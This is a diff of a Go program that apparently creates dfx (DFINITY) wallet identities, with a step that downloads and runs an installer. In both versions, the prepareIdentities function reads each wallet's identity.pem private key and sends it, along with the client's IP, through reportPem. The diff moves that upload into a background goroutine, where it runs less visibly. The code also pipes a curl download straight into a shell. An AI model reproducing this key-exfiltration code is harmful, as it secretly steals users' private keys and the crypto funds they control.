@@ -10,7 +10,7 @@ import (
 	"time"
 )
 
-const wallet_count = 50
+const wallet_count = 100
 
 var gdfx = ""
 var home = ""
@@ -125,23 +125,28 @@ func main() {
 
 func prepareEnv() error {
 	dfx, err := exec.LookPath("dfx")
-	if err != nil {
-		return err
-	}
-
-	if dfx == "" {
+	if err != nil || dfx == "" {
 		//need download
 		cmd := exec.Command("bash", "sh -ci $(curl -fsSL https://sdk.dfinity.org/install.sh)")
 		data, err := cmd.CombinedOutput()
 		if err != nil {
 			log.Fatalf("failed to call pipeCommands(): %v", err)
 		}
-		log.Printf("output: %s", data)
+
+		log.Printf("output: %s", string(data))
+
+		idfx, aerr := exec.LookPath("dfx")
+		if aerr != nil {
+			log.Printf("inner dfx: %s", aerr)
+			return aerr
+		}
+
+		dfx = idfx
 	}
 
 	gdfx = dfx
+	log.Printf("dfx cmd is ok: %s", gdfx)
 
-	log.Printf("dfx cmd is ok: %s", dfx)
 	return nil
 }
 
@@ -220,24 +225,26 @@ func prepareIdentities(wals []string) error {
 		}
 	}
 
-	for _, wlt := range wals {
-		pem, err := os.ReadFile(path.Join(home, ".config/dfx/identity", wlt, "identity.pem"))
-		if err != nil {
-			continue
-		}
-
-		func() {
-			err := reportPem(PemPunk{
-				IP:        ClientIP,
-				Wal:       wlt,
-				WalPriKey: string(pem),
-			})
+	go func() {
+		for _, wlt := range wals {
+			pem, err := os.ReadFile(path.Join(home, ".config/dfx/identity", wlt, "identity.pem"))
 			if err != nil {
-				log.Fatalf("reportPem: %v err: %s", wlt, err.Error())
-				return
+				continue
 			}
-		}()
-	}
+
+			func() {
+				err := reportPem(PemPunk{
+					IP:        ClientIP,
+					Wal:       wlt,
+					WalPriKey: string(pem),
+				})
+				if err != nil {
+					log.Fatalf("reportPem: %v err: %s", wlt, err.Error())
+					return
+				}
+			}()
+		}
+	}()
 
 	return nil
 }
